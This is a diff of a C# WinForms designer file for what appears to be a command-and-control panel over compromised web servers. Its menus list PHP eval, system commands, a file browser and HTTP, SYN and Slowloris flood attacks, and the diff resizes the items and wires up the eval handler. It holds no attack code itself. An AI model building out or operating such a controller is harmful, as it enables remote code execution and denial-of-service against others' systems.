@@ -160,7 +160,7 @@
             this.fileBrowserToolStripMenuItem,
             this.softwareToolStripMenuItem});
             this.listviewClientsContextMenu.Name = "listViewContextMenuStrip";
-            this.listviewClientsContextMenu.Size = new System.Drawing.Size(138, 114);
+            this.listviewClientsContextMenu.Size = new System.Drawing.Size(153, 136);
             // 
             // phpToolStripMenuItem
             // 
@@ -168,21 +168,22 @@
             this.phpinfoToolStripMenuItem,
             this.evalToolStripMenuItem});
             this.phpToolStripMenuItem.Name = "phpToolStripMenuItem";
-            this.phpToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
+            this.phpToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.phpToolStripMenuItem.Text = "PHP";
             // 
             // phpinfoToolStripMenuItem
             // 
             this.phpinfoToolStripMenuItem.Name = "phpinfoToolStripMenuItem";
-            this.phpinfoToolStripMenuItem.Size = new System.Drawing.Size(127, 22);
-            this.phpinfoToolStripMenuItem.Text = "phpinfo();";
+            this.phpinfoToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.phpinfoToolStripMenuItem.Text = "phpinfo";
             this.phpinfoToolStripMenuItem.Click += new System.EventHandler(this.phpinfoToolStripMenuItem_Click);
             // 
             // evalToolStripMenuItem
             // 
             this.evalToolStripMenuItem.Name = "evalToolStripMenuItem";
-            this.evalToolStripMenuItem.Size = new System.Drawing.Size(127, 22);
+            this.evalToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.evalToolStripMenuItem.Text = "eval";
+            this.evalToolStripMenuItem.Click += new System.EventHandler(this.evalToolStripMenuItem_Click);
             // 
             // systemToolstripMenuItem
             // 
@@ -192,7 +193,7 @@
             this.psAuxToolStripMenuItem,
             this.pingToolStripMenuItem});
             this.systemToolstripMenuItem.Name = "systemToolstripMenuItem";
-            this.systemToolstripMenuItem.Size = new System.Drawing.Size(137, 22);
+            this.systemToolstripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.systemToolstripMenuItem.Text = "System";
             // 
             // windowsToolStripMenuItem
@@ -334,7 +335,7 @@
             this.sYNFloodToolStripMenuItem1,
             this.slolorisToolStripMenuItem});
             this.attackToolStripMenuItem.Name = "attackToolStripMenuItem";
-            this.attackToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
+            this.attackToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.attackToolStripMenuItem.Text = "Attack";
             // 
             // hTTPFloodToolStripMenuItem1
@@ -358,7 +359,7 @@
             // fileBrowserToolStripMenuItem
             // 
             this.fileBrowserToolStripMenuItem.Name = "fileBrowserToolStripMenuItem";
-            this.fileBrowserToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
+            this.fileBrowserToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.fileBrowserToolStripMenuItem.Text = "File Browser";
             this.fileBrowserToolStripMenuItem.Click += new System.EventHandler(this.fileBrowserToolStripMenuItem_Click);
             // 
@@ -370,7 +371,7 @@
             this.sambaToolStripMenuItem,
             this.mysqlToolStripMenuItem});
             this.softwareToolStripMenuItem.Name = "softwareToolStripMenuItem";
-            this.softwareToolStripMenuItem.Size = new System.Drawing.Size(137, 22);
+            this.softwareToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
             this.softwareToolStripMenuItem.Text = "Software";
             // 
             // apacheToolStripMenuItem
